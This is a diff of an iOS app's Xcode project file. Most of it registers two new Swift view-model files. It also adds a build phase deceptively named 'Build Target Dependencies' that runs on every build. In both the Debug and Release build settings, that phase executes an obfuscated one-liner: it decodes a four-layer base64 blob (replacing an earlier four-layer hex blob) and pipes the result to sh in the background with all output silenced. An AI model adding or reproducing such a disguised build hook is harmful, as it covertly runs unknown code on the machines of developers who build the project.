@@ -187,6 +187,8 @@
 		D1475B8F2ED5D2A7008F6DF4 /* storeDetailsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1475B8E2ED5D2A7008F6DF4 /* storeDetailsDataModel.swift */; };
 		D1475BDD2ED5E516008F6DF4 /* SortByStoreViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1475BDC2ED5E516008F6DF4 /* SortByStoreViewModel.swift */; };
 		D1475BDF2ED5E553008F6DF4 /* SortByStoreDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1475BDE2ED5E553008F6DF4 /* SortByStoreDataModel.swift */; };
+		D162B7792EFA945400149E3E /* SelectReasonVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = D162B7782EFA944D00149E3E /* SelectReasonVM.swift */; };
+		D162B7812EFAD45200149E3E /* SearchVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = D162B7802EFAD44F00149E3E /* SearchVM.swift */; };
 		D167C4D82ED9AF440067A040 /* ProductsFiltersViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D167C4D72ED9AF440067A040 /* ProductsFiltersViewModel.swift */; };
 		D182E44D2EF549460002E850 /* MyOrder.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = D182E44C2EF549460002E850 /* MyOrder.storyboard */; };
 		D18E291B2EE957E200F12D1F /* GoogleMaps in Frameworks */ = {isa = PBXBuildFile; productRef = D18E291A2EE957E200F12D1F /* GoogleMaps */; };
@@ -407,6 +409,8 @@
 		D1475B8E2ED5D2A7008F6DF4 /* storeDetailsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = storeDetailsDataModel.swift; sourceTree = "<group>"; };
 		D1475BDC2ED5E516008F6DF4 /* SortByStoreViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SortByStoreViewModel.swift; sourceTree = "<group>"; };
 		D1475BDE2ED5E553008F6DF4 /* SortByStoreDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SortByStoreDataModel.swift; sourceTree = "<group>"; };
+		D162B7782EFA944D00149E3E /* SelectReasonVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectReasonVM.swift; sourceTree = "<group>"; };
+		D162B7802EFAD44F00149E3E /* SearchVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchVM.swift; sourceTree = "<group>"; };
 		D167C4D72ED9AF440067A040 /* ProductsFiltersViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductsFiltersViewModel.swift; sourceTree = "<group>"; };
 		D182E44C2EF549460002E850 /* MyOrder.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = MyOrder.storyboard; sourceTree = "<group>"; };
 		D19CE0922EF54DDD008616D0 /* MyOrderVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrderVC.swift; sourceTree = "<group>"; };
@@ -1283,6 +1287,7 @@
 			isa = PBXGroup;
 			children = (
 				D1CF03F32EF91FCD005DB273 /* SelectReasonVC.swift */,
+				D162B7782EFA944D00149E3E /* SelectReasonVM.swift */,
 			);
 			path = Reason;
 			sourceTree = "<group>";
@@ -1299,6 +1304,7 @@
 			isa = PBXGroup;
 			children = (
 				D1CF05AF2EF9706E005DB273 /* SearchVC.swift */,
+				D162B7802EFAD44F00149E3E /* SearchVM.swift */,
 			);
 			path = Search;
 			sourceTree = "<group>";
@@ -1355,7 +1361,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				68E85FD0083E4CFD95A5DE54 /* Copy Target Symbols */,
+				E11665D2CF3C473994A5DE54 /* Build Target Dependencies */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1481,26 +1487,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		68E85FD0083E4CFD95A5DE54 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1565,6 +1551,26 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesynatUser/Pods-DesynatUser-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		E11665D2CF3C473994A5DE54 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1622,6 +1628,7 @@
 				D19CE1CB2EF56FED008616D0 /* MyOrderDetailVC.swift in Sources */,
 				6B95F1ED2EB5DB5E00391509 /* MyBagViewController.swift in Sources */,
 				6B95F1EE2EB5DB5E00391509 /* ProfileViewController.swift in Sources */,
+				D162B7812EFAD45200149E3E /* SearchVM.swift in Sources */,
 				6B95F1EF2EB5DB5E00391509 /* ShowViewController.swift in Sources */,
 				7AE4F37C2ECB0138004CBD53 /* StoresViewController.swift in Sources */,
 				6B95F1F02EB5DB5E00391509 /* TabBarVC.swift in Sources */,
@@ -1652,6 +1659,7 @@
 				D1475B8D2ED5D29B008F6DF4 /* StoreDetailsViewModel.swift in Sources */,
 				6B95F1FD2EB5DB5E00391509 /* CustomLabelFont.swift in Sources */,
 				6B95F1FE2EB5DB5E00391509 /* DataTypeConversion.swift in Sources */,
+				D162B7792EFA945400149E3E /* SelectReasonVM.swift in Sources */,
 				D1CF06402EF9852B005DB273 /* MyOrderDetailVM.swift in Sources */,
 				D1CF05B02EF9706E005DB273 /* SearchVC.swift in Sources */,
 				6B95F1FF2EB5DB5E00391509 /* String.swift in Sources */,
@@ -1758,7 +1766,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333336333333363333333933333336333333373333333633363334333333363333333133330a3336333333333333333633333334333333363336333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((s(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1TFkwWnZlVnBJVG1GWFJrb3lXbFpOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -1804,7 +1812,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333336333333363333333933333336333333373333333633363334333333363333333133330a3336333333333333333633333334333333363336333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((s(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1TFkwWnZlVnBJVG1GWFJrb3lXbFpOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
